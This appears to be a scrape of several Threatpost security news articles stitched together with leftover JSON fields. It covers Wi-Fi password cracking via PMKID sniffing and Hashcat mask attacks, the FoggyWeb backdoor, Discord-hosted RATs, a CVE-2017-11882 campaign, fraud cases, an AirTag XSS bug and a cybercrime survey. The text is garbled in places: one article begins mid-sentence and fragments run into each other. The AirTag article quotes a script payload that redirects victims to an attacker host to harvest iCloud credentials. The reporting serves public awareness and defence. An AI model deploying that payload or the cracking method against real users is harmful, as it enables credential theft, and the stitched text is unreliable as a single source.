        "text": "A researcher was able to crack 70 percent of the gathered hashes in an experiment in a residential neighborhood.\nWar-driving \u2013 the process of driving around mapping residential Wi-Fi networks in hopes of finding a vulnerability to exploit \u2013 can still pay off for attackers, apparently: A CyberArk researcher recently found he could easily slice open about 70 percent of Wi-Fi network passwords in one Tel Aviv community, all at once.\nCyberArk\u2019s Ido Hoorvitch ran the experiment after observing that across multiple apartment moves, his neighbors\u2019 mobile numbers turned out to also be their Wi-Fi passwords. He knew this because he asked to piggyback on the neighbors\u2019 Wi-Fi while waiting for cable to be installed.\nFrom there, \u201cI hypothesized that most people living in Israel (and globally) have unsafe Wi-Fi passwords that can be easily cracked or even guessed by curious neighbors or malicious actors,\u201d he noted in a Tuesday blog. Well, it turns out he was right.\nWalking, Sniffing & Cracking in Tel Aviv\nTo carry out the experiment, Hoorvitch gathered 5,000 Wi-Fi network hashes by strolling the streets in Tel Aviv with readily available, commercial Wi-Fi sniffing equipment.\nHis hash-sniffing rig consisted of a $50 AWUS036ACH ALFA wireless network interface card (NIC) installed in a cheap Ubuntu machine and the Hcxdumptool utility from ZerBea. Hcxdumptool, available on GitHub, is used to capture packets from WLAN devices. The NIC has monitor-mode capabilities, which allows packet capturing without having to associate with an access point, the researcher explained.\nAfter gathering what he felt was a decent sample size of 5,000 SSIDs and password hashes, it was then time to get crackin\u2019 \u2013 literally.\n\u201cOur first step in the cracking procedure is to install Hashcat, the world\u2019s fastest and most advanced password-recovery tool,\u201d he said, which includes several password-cracking methods like mask and dictionary attacks.\nAfter he converted the sniffing results into a hashfile format compatible with Hashcat, he ran them through a mask attack, which is a process of trying all possible combinations from a set of characters. Mask attacks are more specific than, say, brute-force attacks, because the list of characters in the set is reduced based on information an attacker knows.\nIn this case, the Hashcat command tried all of the possible cellphone number combinations in Israel against each hash.\n\u201cWe chose to start with what\u2019s called a mask attack, due to the terrible habit many people living in Israel have of using their cellphone numbers as Wi-Fi passwords,\u201d he said, adding that this approach becomes easier because the Israeli cellphone prefix is always the same: 05.\n\u201c[Numbers] are 10 digits long and it starts with 05,\u201d Hoorvitch explained. \u201cTherefore, we need to guess the remaining eight digits. Each digit has 10 options (0-9), hence 10**8 possible combinations.\u201d\nThat translates into millions of combinations, but his laptop was able to cycle through 194,000 hashes per second. Upon the first run of the mask, he was able to crack 2,200 passwords.\nThe next step was mounting a standard dictionary attack, in which a set of common passwords is tried against a given account.\n\u201cWith the most common dictionary, Rockyou.txt, [we] cracked more than 900 hashes,\u201d said Hoorvitch, bringing the total to around 3,500 cracked passwords, or 70 percent of the hashes he had gathered.\nRoaming Insecurity\nWhile the obvious moral of the story is that most people use dumb passwords, the other part of the narrative is the fact that Hoorvitch used a relatively new sniffing technique that only works with routers that support roaming features (which he details in his post).\nRoaming routers are usually deployed in city- or campus-mesh type situations where Wi-Fi is deployed as a blanket of internet access using multiple access points (APs). They use something called PMKID keys, which are unique key identifiers used to keep track of the password hash being used for the client as a person moves from router to router, to ensure continuous connectivity.\nMany routers have dual-purpose capabilities so that roaming options often show up in APs in residential settings even though their owners don\u2019t need the functionality.\n\u201cNot all routers support roaming features and are, therefore, not vulnerable to the PMKID attack,\u201d Hoorvitch said. \u201cHowever, our research found that routers manufactured by many of the world\u2019s largest vendors are vulnerable.\u201d\nThus, turning off roaming (if possible) is a good mitigation to war-driving. Otherwise, previous sniffing techniques required an attacker to be able to intercept the four-way handshake that happens when someone connects an AP \u2013 which prevents any cracking at scale.\n\u201cAs I estimated beforehand, the process of sniffing Wi-Fis and the subsequent cracking procedures was a very accessible undertaking in terms of equipment, costs and execution,\u201d the researcher noted. \u201cThe bottom line is that in a couple of hours and with approximately $50, your neighbor or a malicious actor can compromise your privacy and much more if you don\u2019t have a strong password.\u201d\nHow to Protect Against Wi-Fi Cyberattacks\nExploitation stakes can be high when it comes to routers: Hoorvitch pointed out that breaking into a residential network allows attackers to pivot to any of its connected devices to steal information or drop malware. With people working from home since the pandemic, this could also have big consequences for business data protection.\n\u201cFor the small business, the risk lies in an attacker infiltrating a network and then moving laterally to high-value applications or data, such as a billing system or cashier,\u201d according to the analysis. \u201cConcerning the enterprise, it\u2019s possible for an attacker to gain initial access to a remote user\u2019s Wi-Fi and then hop to the user\u2019s computer and wait for a VPN connection or for the user to go to the office and move laterally from there.\u201d\nTo protect themselves, users should of course replace any default usernames and passwords, and choose complex passwords. They should also disable weak encryption protocols (such as WAP or WAP1) and disable WPS, the researcher advised.\nCheck out our free upcoming live and on-demand online town halls \u2013 unique, dynamic discussions with cybersecurity experts and the Threatpost community.\nWrite a comment\nShare this article:\nMobile Security\nVulnerabilities\nWeb Security",

        "title": "SolarWinds Attackers Hit Active Directory Servers with FoggyWeb Backdoor",
        "author": "Elizabeth Montalbano",
        "date": "September 28, 2021 10:39 am",
        "text": "Microsoft is warning that the Nobelium APT is compromising single-sign-on servers to install a post-exploitation backdoor that steals data and maintains network persistence.\nThe threat actors behind the notorious SolarWinds supply-chain attacks have dispatched new malware to steal data and maintain persistence on victims\u2019 networks, researchers have found.\nResearchers from the Microsoft Threat Intelligence Center (MSTIC) have observed the APT it calls Nobelium using a post-exploitation backdoor dubbed FoggyWeb, to attack Active Directory Federation Services (AD FS) servers. AD FS enables single sign-on (SSO) across cloud-based apps in a Microsoft environment, by sharing digital identity and entitlements rights.\nThe attacks started as far back as April, Ramin Nafisi from MSTIC wrote in a blog post published Monday.\nNobelium is employing \u201cmultiple tactics to pursue credential theft\u201d to gain admin privileges to AD FS servers, Nafisi wrote. Then, once a server is compromised, the threat group deploys FoggyWeb \u201cto remotely exfiltrate the configuration database of compromised AD FS servers, decrypted token-signing certificates and token-decryption certificates,\u201d he said, which can be used to penetrate into users\u2019 cloud accounts.\nIn addition to remotely exfiltrating sensitive data, FoggyWeb also achieves persistence and communicates with a a command-and-control (C2) server to receive additional malicious components and execute them, Nafisi added.\nBackdoor Breakdown\nNafisi provides a thorough breakdown of the sophisticated FoggyWeb backdoor, which operates by allowing abuse of the Security Assertion Markup Language (SAML) token in AD FS, he explained in the post.\n\u201cThe backdoor configures HTTP listeners for actor-defined URIs that mimic the structure of the legitimate URIs used by the target\u2019s AD FS deployment,\u201d Nafisi wrote. \u201cThe custom listeners passively monitor all incoming HTTP GET and POST requests sent to the AD FS server from the intranet/internet and intercept HTTP requests that match the custom URI patterns defined by the actor.\u201d\nAttackers store the malware in an encrypted file called Windows.Data.TimeZones.zh-PH.pri, while the malicious file version.dll acts as a loader. The DLL file leverages the CLR hosting interfaces and APIs to load FoggyWeb, a managed DLL, in the same Application Domain within which legitimate AD FS managed code is executed.\nIn this way, FoggyWeb gains access to the AD FS codebase and resources, including the AD FS configuration database. The malware also inherits AD FS service account permissions that are required to access the AD FS configuration database, Nafisis wrote.\nAdditionally, \u201cbecause FoggyWeb is loaded into the same application domain as the AD FS managed code, it gains programmatical access to the legitimate AD FS classes, methods, properties, fields, objects and components that are subsequently leveraged by FoggyWeb to facilitate its malicious operations,\u201d he added.\nMoreover, FoggyWeb is also AD FS version-agnostic, which means it doesn\u2019t need to keep track of legacy versus modern configuration table names and schemas, named pipe names and other version-dependent properties of AD FS, Nafisi wrote.\nMalware Mitigation\nMicrosoft has notified all customers observed being targeted or compromised by FoggyWeb, as well as included a comprehensive list of compromise indicators in the post.\nThe company also has recommended several mitigation actions for organizations, including: Auditing of on-premises and cloud infrastructure to identify any changes the actor might have made to maintain access; removing user and app access, reviewing configurations for each, and re-issuing new, strong credentials; and using a hardware security module to prevent the exfiltration of sensitive data.\nMicrosoft also is advising that all customers review their AD FS Server configuration and implement whatever changes are needed to secure the systems from attacks.\nTracking a Known Threat Actor\nMicrosoft researchers have been keeping a wary eye on Nobelium since the company got caught up in the SolarWinds attack that was first discovered late last year. They\u2019ve been tracking the threat group\u2019s activity and capabilities, which have expanded as the actors have built and deployed new malware.\nSince the SolarWinds incident, researchers have observed Nobelium steadily building out its arsenal beyond the Sunburst/Solorigate backdoor and Teardrop malware it initially deployed in that attack, which reached tens of thousands of organizations around the globe (though fewer than 100 were selected by the attackers for actual breach and compromise).\nThe group used malware called Raindrop in those follow-on SolarWinds attacks, then later added GoldMax, GoldFinder and Sibot malware for layered persistence to its toolset.\nMicrosoft researchers also identified EnvyScout, BoomBox, NativeZone and VaporRage as four pieces of malware that were used in a Nobelium email-based attack chain earlier this year.\nRule #1 of Linux Security: No cybersecurity solution is viable if you don\u2019t have the basics down.

        "text": "The kid was busted after abusing Google Ads to lure users to his fake gift card site. \nDuring the early days of the pandemic, while the rest of the world was stress streaming and working on sourdough starter, an ambitious teen stuck in his bedroom decided to set up a fake \u201cLove2Shop\u201d gift card site to harvest people\u2019s payment information, invest the stolen money in cryptocurrency and become a millionaire.\nThe intrepid 17-year-old in the U.K. collected just under $9,000 before the real Love2Shop caught on when customers started to complain, according to a local report from Lincolnshire Live. The boy\u2019s name is being withheld because he\u2019s a juvenile.\nHis age certainly didn\u2019t prohibit the scammer from being allowed to purchase Google ads to help lure people to his phishing scam site, according to prosecutors, ultimately ranking the scam phishing site over the legitimate one.\nIn all, law enforcement said they found 12,000 credit card numbers and 197 PayPal accounts on his computer. They added that he had collected more than $440,000 in stolen money.\n\u201cHe had received through his PayPal accounts between January and March 2020 a total of \u00a3323,000,\u201d the case\u2019s prosecutor, Sam Skinner, said, according to Lincolnshire Live. \u201cThese sums came into his account and were transferred into cryptocurrency.\u201d\nGrift Cash Invested in Crypto\nTurns out not only did the teen set up a lucrative criminal enterprise, but he\u2019s also a wicked investor. His cryptocurrency investments were enormously profitable, ultimately climbing to more than $2.5 million.\n\u201cThe police found a large quantity of cryptocurrency,\u201d Skinner added, \u201cThere were 48 Bitcoins and a smaller number of other coins. At the time they were worth \u00a3200,000. They are now worth a little over \u00a32 million.\u201d\nThe teen was sentenced to a year in youth rehabilitation for fraud and money laundering. His Bitcoin was also confiscated.\nCybersecurity Fundamentals\nA bored kid being able to pull off a heist of this size is a symptom of the wider cybersecurity community\u2019s lack of fidelity to fundamentals, according to John Bambenek, principal threat hunter with Netenrich.\n\u201cUltimately, 40 years on with Internet-connected technologies and we still can\u2019t resolve two basic problems: How can consumers verify that the websites they visit are legitimate? And, How can financial institutions validate transactions are legitimate?\u201d Bambenek told Threatpost. \u201cWe\u2019re failing so profoundly at the very basics that children can literally become millionaire criminals.\u201d\nAnd the blame so often placed on users for falling victims to cybercrime hasn\u2019t helped anyone but the attackers, as pointed out to Threatpost by Archie Agarwal, CEO of ThreatModeler. He added that companies with massive platforms like Google and PayPal have a responsibility to protect their platforms from being abused.\nSecuring Massive Platforms from Abuse\n\u201cWith the prevalence of open-source tools that scrape and rebuild replica existing websites in minutes, this type of crime is very hard to prevent,\u201d Agarwal wrote. \u201cAnd we must not make the mistake of blaming the victims for clicking links on a system built on clicking links. It is the duty of the security community and the large Internet companies such as Google and PayPal, who were used in this scam, to find ways for alarms to trip to protect users as fast as possible.\u201d\nThreatpost asked Google directly about the U.K. teen\u2019s ability to use Google\u2019s advertising platform for criminal gain, and a spokesperson provided this response:\n\u201cOur goal is to create a safe and trustworthy experience for users. We take matters of ad fraud very seriously and continue to vigorously enforce our policies and be nimble when faced with new threats.\u201d\nGoogle\u2019s current ad policies prohibit brand impersonation, replicating original content and various other forms of misrepresentation scammers use to abuse Google\u2019s platform.\nWhen last March\u2019s Ads Safety Report was released, Google vice president Scott Spencer acknowledged that the pandemic and disinformation campaigns aimed at elections around the world have presented the company with a complicated set of challenges over the past year; but pledged to continue to invest in cybersecurity at scale.\nSpencer explained that it\u2019s just smart business: \u201cPreserving trust for advertisers and publishers helps their businesses succeed in the long term,\u201d he wrote. \u201cIn the upcoming year, we will continue to invest in policies, our team of experts and enforcement technology to stay ahead of potential threats.\u201d\nCheck out our free upcoming live and on-demand online town halls \u2013 unique, dynamic discussions with cybersecurity experts and the Threatpost community.\nWrite a comment\nShare this article:\nHacks\nWeb Security",

        "text": "The platform\u2019s Content Delivery Network and core features are being used to send malicious files\u2014including RATs\u2013across its network of 150 million users, putting corporate workplaces at risk.\nThreat actors are abusing the core features of the popular Discord digital communication platform to persistently deliver various types of malware\u2014in particular remote access trojans (RATs) that can take over systems\u2013putting its 150 million users at risk, researchers have found.\nRiskIQ and CheckPoint both discovered multi-functional malware being sent in messages across the platform, which allows users to organize Discord servers into topic-based channels in which they can share text, image or voice files or other executables. Those files are then stored on Discord\u2019s Content Delivery Network (CDN) servers.\nResearchers warn, \u201cmany files sent across the Discord platform are malicious, pointing to a significant amount of abuse of its self-hosted CDN by actors by creating channels with the sole purpose of delivering these malicious files,\u201d according to a report published Thursday by Team RiskIQ.\nInitially Discord attracted gamers, but the platform is now being used by organizations for workplace communication. The storage of malicious files on Discord\u2019s CDN and proliferation of malware on the platform mean that \u201cmany organizations could be allowing this bad traffic onto their network,\u201d RiskIQ researchers wrote.\nRATs and Miscellaneous Malware\nFeatures of the latest malware found on the platform include the capability to take screenshots, download and execute additional files, and perform keylogging, CheckPoint researchers Idan Shechter and Omer Ventura disclosed in a separate report also published Thursday.\nCheckPoint also found that the Discord Bot API\u2014a simple Python implementation that eases modifications and shortens the development process of bots on the platform\u2013\u201ccan easily turn the bot into a simple RAT\u201d that threat actors can use \u201cto gain full access and remote control on a user\u2019s system.\u201d\nDiscord bots are becoming an increasingly integral part of how users interact with Discord, allowing them to integrate code for enhanced features to facilitate community management, researchers said.\n\u201cDiscord bots appear to be powerful, friendly and highly time-saving,\u201d Shechter and Ventura wrote. \u201cHowever, with great power also comes great responsibility, and Discord\u2019s bot framework can be easily used for malicious intent.\u201d\nCheckPoint researchers discovered several malicious repositories among GitHub that are relevant for the Discord platform. These repositories include malware based on Discord API and malicious bots with different functionalities, they said.\nExploiting Discord Channels\nMeanwhile, RiskIQ researchers examined Discord CDN URLs containing .exe, DLL and various document and compressed files, discovering upon review of the hashes on VirusTotal that more than 100 were delivering malicious content. Eighty files were from 17 malware different families, with trojans comprising the most common malware observed on the platform, researchers said.\nSpecifically, RiskIQ researchers took a deeper dive into how Discord CDN uses a Discord domain through links that use [hxxps://cdn.discordapp[.]com/attachments/{ChannelID}/{AttachmentID}/{filename}] as the format to discover malware, they said.\nResearchers detected links and queried Discord channel IDs used in these links, which enabled them to identify domains containing web pages that link out to a Discord CDN link with a specific channel ID, they said.\n\u201cFor example, the RiskIQ platform can query the channel IDs associated with zoom[-]download[.]ml,\u201d researchers explained. \u201cThis domain attempts to spoof users into downloading a Zoom plug-in for Microsoft Outlook and instead delivers the Dcstl password stealer hosted on Discord\u2019s CDN.\u201d\nIn another example, RiskIQ discovered that the channel ID for a URL containing a Raccoon password stealer file returned a domain for Taplink, a site that provides users with micro landing pages to direct individuals to their Instagram and other social media pages, they explained.\n\u201cA user likely added the Discord CDN link to their Taplink page,\u201d researchers explained. \u201cQuerying these IDs enables RiskIQ users to understand which Discord files and associated infrastructure are concerning and where they are across the web.\u201d\nThe technique enabled researchers to determine the date and time Discord channels were created, linking ones created within a few days before the first observation of a file in VirusTotal to channels with the sole purpose of distributing malware, they said. Ultimately, they uncovered and cataloged 27 unique malware types hosted on Discord\u2019s CDN.\nSecurity Holes Persist\nThe latest research isn\u2019t the first time Discord has been called out for a malware problem. In July researchers from Sophos revealed that the number of Discord malware detections rose sharply compared to last year, also observing abuse of the CDN to host malicious files. Researchers also said at the time that Discord\u2019s API was being leveraged to exfiltrate stolen data and facilitate hacker command-and-control channels.\nThe findings unsurprisingly raised an alarm among security experts, who said they demonstrate numerous holes with platforms that people widely use to communicate and share files that rely on the use of encrypted traffic for security.\nHowever, as has been observed many times before, encrypting traffic on APIs alone is not sufficient to keep malware off a content delivery network, noted one security professional.\n\u201cAPI abuse is best defended by ensuring that only genuine software clients can use the API, thus preventing malicious scripts and malware doing damage to the platform, David Stewart, CEO of security firm Approov, said in an email to Threatpost.\nThe discovery also highlights a key problem in the development of communication platforms\u2014the emphasis on functionality rather than security, said another security professional.\n\u201cThis is an example of an exploitation that probably could have been addressed with a better software design,\u201d Saryu Nayyar, CEO of security firm Gurucul, said in an email to Threatpost.\nThat said, Discord\u2019s developers need to think about adding a way to collect and analyze data in real time from the platform to discover and quickly remediate unusual activity, she said.\n\u201cAbsent a redesign of the Discord software, this is the only realistic way of detecting malware is to look for activities that are out of the ordinary,\u201d Nayyar observed.\nWrite a comment\nShare this article:\nMalware",

They\u2019re delivering the RATs in malicious documents by exploiting CVE-2017-11882, according to a report published Tuesday by Cisco Talos.\nThe threat group \u2013 tracked by Cisco Talos from the beginning of the year through the summer \u2013 disguises itself behind a front that seems legitimate, posing as a Pakistani IT firm called Bunse Technologies, researchers said.\nCVE-2017-11882 is a more than 20-year-old memory corruption vulnerability in Microsoft Office that persisted for 17 years before the company patched it in 2017. However, as recently as two years ago, attackers were seen exploiting the bug, which allows them to run malicious code automatically without requiring user interaction.\nThe advanced persistent threat (APT) behind the campaign also uses a custom file enumerator and infector in the reconnaissance phase of the two-step attack, followed by a second phase added in later versions of the campaign that deploys the ultimate RAT payload, researchers said.\nTo host the malware payloads, the threat actor registered multiple domains with political and government themes used to fool victims, particularly ones linked to diplomatic and humanitarian efforts in Afghanistan to target entities in that country, researchers said.\n\u201cThis campaign is a classic example of an individual threat actor employing political, humanitarian and diplomatic themes in a campaign to deliver commodity malware to victims\u201d \u2013 in this case, RATs \u201cpacked with multiple functionalities to achieve complete control over the victim\u2019s endpoint,\u201d Cisco Talos\u2019 Asheer Malhotra wrote in the post.\nOut-of-the-Box Benefits\nThe campaign reflects an increased trend by both cybercriminals and APTs to use commodity RATs instead of custom malware against victims for a number of reasons, researchers said.\nUsing commodity RATs gives attackers a range of out-of-the-box functionality, including preliminary reconnaissance capabilities, arbitrary command execution and data exfiltration, researchers noted. The RATs also \u201cact as excellent launch pads for deploying additional malware against their victims,\u201d Malhotra wrote.\nUsing commodity malware also saves attackers both the time and resource investment in developing custom malware, as the RATs have stock features requiring minimal configuration changes, researchers said.\nIn their post, researchers broke down the two-stage attack process as well as the specifics of each RAT they observed attackers using in the campaign. RAT functionality varies depending on the payload, they said, but generally includes capabilities such as remote shells, process management, file management, keylogging, arbitrary command execution and credential stealing.\nInitial Infection and Reconnaissance\nThe infection chain consists of a reconnaissance phase that starts with malicious RTF documents and PowerShell scripts that ultimately distribute malware to victims.\nSpecifically, the threat actor uses the RTF to exploit the Office bug and execute a malicious PowerShell command that extracts and executes the next-stage PowerShell script. That script then base64 decodes another payload \u2013 in the case researchers observed, it was a loader executable \u2013 and activates it on the infected endpoint, Malhotra wrote.\nThe loader executable begins by establishing persistence for itself using a shortcut in the current user\u2019s Startup directory and then compiles hardcoded C# code into an executable assembly. It then invokes the entry point for the compiled malicious code \u2013 the previously mentioned custom file enumerator and infector \u2013 researchers found.\nThis C# code \u2013 which is the final payload in the reconnaissance phase \u2013 contains the file enumerator, which lists specific file types on the endpoint and sends the file paths to the command-and-control (C2) server along with file infector modules, which are different than typical executable infectors usually seen in the wild, Malhotra noted.\n\u201cThese modules are used for infecting benign Office documents with malicious OLE objects to weaponize them to exploit CVE-2017-11882,\u201d he wrote.\nAttack Phase\nResearchers observed attackers switching up tactics to deploy commodity RATs as the final payload starting in July, they said.\nTo do this, attackers tweaked the reconnaissance process slightly to leverage the second-stage PowerShell script to create a BAT file on disk, researchers said. That file, in turn, would execute another PowerShell command to download and activate the RAT payload on the infected endpoint, retrieving it from one of the sites attackers set up.\n\u201cSo far, we\u2019ve observed the delivery of three types of payloads from the remote locations discovered in this phase of the campaign: DcRAT, QuasarRAT and a legitimate copy of the remote desktop client AnyDesk,\u201d Malhotra wrote.\nThe use of the last payload \u201cindicates a focus on manual operations where the actor would have logged into the infected devices to discern if the access was of any value,\u201d according to the writeup.\nAll in all, the tactics of the APT used in the campaign demonstrate \u201caggressive proliferation\u201d as the goal, as the use of out-of-the-box malware combined with customized file infections gives them a straightforward point of entry onto a victim\u2019s network, Malhotra observed.\n\u201cOrganizations should remain vigilant against such threats that are highly motivated to proliferate using automated mechanisms,\u201d he wrote.\nHowever, it seems likely that the group will eventually abandon its use of commodity malware for its own bespoke tools, which means there will probably be more threat campaigns in its future, researchers said.\nCheck out our free upcoming live and on-demand online town halls \u2013 unique, dynamic discussions with cybersecurity experts and the Threatpost community.\nWrite a comment\nShare this article:\nGovernment\nMalware\nMobile Security\nVulnerabilities\nWeb Security",

        "text": "A former medical records tech stole PII that was then used to fraudulently claim DoD and VA benefits, particularly targeting disabled veterans.\nMore than 3,300 U.S. military service members, military dependents and civilians employed by the Department of Defense were compromised as part of a transnational cybercrime ring created to defraud them out of $1.5 million in military benefits from the DoD and the Department of Veterans Affairs.\nA former civilian medical records technician and administrator with the U.S. Army was at the center of the scheme, according to court documents filed in the U.S. District Court for the Western District of Texas. Fredrick Brown, a Las Vegas resident, was sentenced to 12 and a half years in prison last week, after admitting that between July 2014 and September 2015, he stole personally identifiable information (PII) for thousands of people.\nIn his capacity as a records technician, Brown had access to a military electronic health records database. He admitted that he took screenshots to pilfer names, Social-Security numbers, military ID numbers, dates of birth and contact information from the victims.\nHe sent the information to a Philippines-based co-defendant, Robert Wayne Boling Jr., he said. Boling and associates then used the data to access DoD and benefits sites and steal millions of dollars, according to the court documents.\nAs part of its nefarious work, the ring particularly targeted disabled veterans, who were selected because they were eligible for more service-related benefits, court officials said.\n\u201cThe defendant brazenly preyed on and victimized U.S. servicemembers and veterans, many of whom were disabled and elderly,\u201d said U.S. Attorney Ashley C. Hoff for the Western District of Texas, in a media statement. \u201cAs part of our mission, we strive to protect these honorable men and women from fraud and abuse. If fraudsters target our servicemembers and veterans, we will seek to identify them and hold them accountable. This office will continue to zealously investigate and prosecute perpetrators of these schemes.\u201d\nIn addition to 151 months of prison time, Chief Judge Orlando Garcia ordered Brown to pay $2.3 million in restitution. He\u2019ll also be placed on supervised release for three years after he gets out.\n\u201cRather than honoring those servicemembers and veterans who sacrifice for them, the defendant and his co-conspirators targeted and stole from these brave men and women in a years-long fraud scheme,\u201d said Acting Assistant Attorney General Brian Boynton of the Justice Department\u2019s Civil Division. \u201cSuch conduct is an affront to the United States and will not be tolerated.\u201d\nThe efforts to bring the ring\u2019s participants to justice are ongoing: In July 2020, Garcia sentenced Brown co-defendant and accomplice Trorice Crawford to 46 months in federal prison, a fine of $103,700 and a three-year supervised release post-jail. Brown worked with Crawford to recruit money mules \u2014 individuals who would deposit the stolen funds into their bank accounts and then send the funds through international wire remittance services to the fraudsters in a money-laundering operation, according to the court..\nU.S. service members have been victims of PII exposure in the past. In May for example, a database filled with the medical records of nearly 200,000 U.S. military veterans was exposed online by a vendor working for the VA, and an analyst found that it might have been exfiltrated by ransomware attackers.\nCheck out our free upcoming live and on-demand webinar events \u2013 unique, dynamic discussions with cybersecurity experts and the Threatpost community.\nWrite a comment\nShare this article:\nBreach\nGovernment\nPrivacy\nWeb Security",

        "text": "Apple\u2019s personal item-tracker devices can be used to deliver malware, slurp credentials, steal tokens and more thanks to XSS.\nAn unpatched stored cross-site scripting (XSS) bug in Apple\u2019s AirTag \u201cLost Mode\u201d could open up users to a cornucopia of web-based attacks, including credential-harvesting, click-jacking, malware delivery, token theft and more.\nThat\u2019s according to Bobby Rauch, an independent security researcher who said that it\u2019s possible to use the zero-day to fully weaponize an AirTag, with the ability to attack random strangers (or specific targets) should they interact with it.\nStored XSS, also known as persistent XSS, occurs when a malicious script is injected directly into a vulnerable web application. An attack then only requires that a victim visit a compromised web page.\nA word about how AirTags work: Apple\u2019s AirTags are personal tracking devices that can be attached to keys, backpacks and other items. If an AirTagged item is lost and nearby, a user can \u201cping\u201d the AirTag, which will emit a sound and allow it to be tracked down. If it\u2019s further afield (left behind in a restaurant, etc.), the AirTag sends out a secure Bluetooth signal that can be detected by nearby devices in Apple\u2019s Find My network (which has had its own issues in the past). These devices send the location of the AirTag to iCloud \u2014 and the user can open the Find My app and see the lost item on a map.\nThe Lost Mode function goes hand in hand with the further-afield function. If an AirTag doesn\u2019t show up in the Find My app, a user can mark the AirTag as missing, and will get an alert if it\u2019s later picked up by the Find My network.\nBut the problematic part of Lost Mode has to do with a different perk: If a stranger finds an AirTag in Lost Mode and scans it via near-field communication (NFC), it generates a unique https://found.apple.com page, which contains its serial number, phone number and a personal message for anyone discovering it. The idea is to let people \u201cturn in\u201d missing items to their rightful owners.\nThe issue, according to Rauch, is that these pages don\u2019t have protection for stored XSS \u2013 so, an attacker can inject a malicious payload into the AirTag using the Lost Mode phone number field.\nIn one attack scenario, cybercriminals can use XSS code to redirect victims to the attacker\u2019s fake iCloud page, which has a keylogger installed to capture their credentials.\n\u201cA victim will believe they are being asked to sign into iCloud so they can get in contact with the owner of the AirTag, when in fact, the attacker has redirected them to a credential-hijacking page,\u201d Rauch said in a Tuesday posting. \u201c\u201dSince AirTags were recently released, most users would be unaware that accessing the https://found.apple.com page doesn\u2019t require authentication at all.\u201d\nHe added, \u201cAn attacker can create weaponized AirTags and leave them around, victimizing innocent people who are simply trying to help a person find their lost AirTag.\u201d\nRauch provided an example malicious payload to be entered into the phone number field: \u201c<script>window.location=\u2019https://10.0.1.137:8000/indexer.html\u2019;var a = \u201d;</script>\u201d. He also noted that AirTags could be weaponized to carry out all sorts of attacks.\n\u201c[This is] only one example of the dangers of stored XSS,\u201d he wrote. \u201cThere are countless ways an attacker could victimize an end user who discovers a lost AirTag\u2026The https://found.apple.com link can also be used as a phishing link, and shared via a desktop/laptop, without the need for a mobile device to scan the AirTag. Further injection attacks could occur through the Find My App, which is used to scan third-party devices that support \u2018Lost Mode\u2019 as part of Apple\u2019s Find My network.\u201d\nThe bug has yet to be patched, although Rauch told security journalist Brian Krebs that he reported it to Apple on June 20. Last week, the company told him that it was planning to patch \u201cin an upcoming update.\u201d\nAbsent a timeline for a fix or any response to his multiple questions about credit and acknowledgement, Rauch told Krebs he decided to go public.\nCheck out our free upcoming live and on-demand webinar events \u2013 unique, dynamic discussions with cybersecurity experts and the Threatpost community.\nWrite a comment\nShare this article:\nIoT\nMalware\nVulnerabilities\nWeb Security",

        "text": "Income level, education and being part of a disadvantaged population all contribute to cybercrime outcomes, a survey suggests.\nLower-income and vulnerable populations are disproportionally affected by cybercrime, according to a new survey, which uncovered that demographics play a big role in how often individuals are targeted.\nThe survey results released Monday (from Malwarebytes, Digitunity and Cybercrime Support Network) suggest that minority groups and those with lower incomes and lower education levels are more likely to fall victim to a cyberattack, and some groups are far more likely to encounter online threats.\nFor instance, more women receive text messages from unknown numbers that include potentially malicious links than men (79 percent compared with 73 percent). And almost half (46 percent) of women said they have had their social-media accounts hacked, compared with 37 percent of men.\nSimilarly, more Black people, indigenous people and people of color (BIPOC) have their social-media accounts attacked more often than white people do (45 percent compared with 40 percent); and BIPOC populations also face identity theft more often (21 percent compared with 15 percent). In fact, only 47 percent of BIPOC respondents avoided the financial repercussions of cybercrime, compared with 59 percent of all respondents, making BIPOC respondents the hardest hit financially by cyber-activity.\nAge is a factor, too: People aged 65 years or older account for 36 percent of credit-card information theft occurrences \u2013 far more than any other age group.\nCybercrime Stress\nThere\u2019s an interesting emotional dimension to the findings as well \u2013 one-fifth of women (21 percent) and 23 percent of BIPOC respondents said they experienced \u201csubstantial\u201d stress in dealing with online suspicious activity, compared with 17 percent of all respondents.\nThe statistic is related to general feelings of safety (or lack thereof) in the cyberspace realm, according to the report. While half of all respondents said they don\u2019t feel private online, and 31 percent don\u2019t feel safe online, the numbers are skewed for women: Women feel the least private online (53 percent compared with 47 percent of men); they also feel the least safe (35 percent compared with 27 percent of men).\nSocioeconomic class matters as well. Individuals with a higher income (51 percent) feel safer online than individuals with a lower income (40 percent). The same pattern holds true for education level: Users who have the highest level of education feel more secure (48 percent) than those who completed only university or college (44 percent) or online high school or secondary school (40 percent), the survey found.\nPeople with a low-level income were also significantly more stressed (18 percent) than those in high-level income circumstances (13 percent). However, higher-income respondents said they lost a median of about $2,108, compared with lower-income respondents who lost about $1,311.\n\u201cThe unfortunate finding from this data points to one possible answer: The more money you make, the more comfortable you are online, even if you lose more of that money to an attack,\u201d according to the report. \u201cMoney, it appears, plays an enormous role in feeling safe and private online.\u201d\nSource: Malwarebytes.\n\u201cUnderstanding the impact that cybercrime has on vulnerable people (or populations), particularly women and minorities, across the world is critical as online access becomes essential to modern life,\u201d Marcin Kleczynski, CEO of Malwarebytes, said in a press statement. \u201cThe disparity between populations feeling safe online and the emotional impact of threats on already vulnerable communities is unacceptable\u2026As an industry, we need to work together to make safe internet access available to everyone, regardless of income or their ability to pay.\u201d\nIt should be said that none of the respondents were successful in completely avoiding suspicious online activity, no matter their gender, race, age, income or education level.\n\u201cAs technology and internet accessibility become more entwined in our day-to-day routines, our financial and emotional lives are more significantly impacted by cybercrime,\u201d Robert Burda, interim CEO at Cybercrime Support Network, said in a press statement. \u201cWith a greater understanding of how the digital world impacts disadvantaged communities, we can provide better programs and resources that meet people where they are.\u201d\nThe firms polled 5,000 people in Germany, the United Kingdom and the United States.\nRule #1 of Linux Security: No cybersecurity solution is viable if you don\u2019t have the basics down.

